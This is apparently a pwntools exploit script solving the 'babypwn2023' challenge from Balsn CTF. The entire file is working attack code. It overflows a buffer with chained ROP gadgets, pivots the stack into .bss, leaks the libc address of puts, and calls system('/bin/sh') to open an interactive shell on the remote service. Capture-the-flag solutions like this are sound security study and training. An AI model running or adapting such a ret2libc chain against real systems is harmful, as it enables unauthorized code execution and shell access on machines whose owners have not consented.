from pwn import *

file = ELF("./chall")
libc = ELF("./libc.so.6")

context.terminal = ["kitty"]
script = """
c
"""

if args.GDB:
    p = gdb.debug("./patch", gdbscript=script)
elif args.REMOTE:
    p = remote("babypwn2023.balsnctf.com", 10105)
else:
    p = process("./patch")

putsrax = p64(0x004011b8)
getsrax = p64(0x004011a4)
poprbp = p64(0x000000000040115d)
getsrbp = p64(0x004011a0)
main = p64(file.sym.main)
ret = p64(0x004011c6)
addbl = p64(0x4011c7)
leave = p64(0x004011c5)
increment = p64(0x000000000040115c)
poprdi = 0x000000000002a3e5

chain = b"A" * 32
chain += p64(file.bss(0xc00 + 0x20))
chain += getsrbp
chain += b"AAAAAAAA";
p.sendline(chain)

chain = b"A" * 32
chain += p64(0x1337);
chain += p64(file.sym._start);
chain += b"BBBBBBBB";
p.sendline(chain)

chain = b"A" * 32
chain += p64(0)
chain += p64(file.plt.gets) * 2
chain += p64(file.sym.register_tm_clones)
chain += addbl
chain += poprbp
chain += p64(file.bss(0x400 + 0x20));
chain += getsrbp
p.sendline(chain)

p.sendline(b"")
p.sendline(p32(0) + p8(1) + p8(85) + p16(0))

chain = b"A" * 32
chain += p64(0x404bd8 + 0x3d)
chain += increment * 17
chain += poprbp
chain += p64(0x404bd8 + 0x20 + 8)
chain += getsrbp
p.sendline(chain)

chain = b""
chain += p64(file.got.puts)
chain += p64(file.plt.puts)
chain += p64(file.sym.main)
chain += p64(0)
chain += p64(0)
chain += poprbp
chain += p64(0x404bd8 - 8)
chain += leave
p.sendline(chain)

for _ in range(5): p.recvline()
leak = p.recvline().strip()
leak = u64(leak.ljust(8, b"\x00"))
log.info(f"leak: {leak:x}")
base = leak - libc.sym.puts

chain = b"A" * 32
chain += p64(0)
chain += ret
chain += p64(base + poprdi)
chain += p64(base + next(libc.search(b"/bin/sh")))
chain += p64(base + libc.sym.system)
p.sendline(chain)

p.interactive()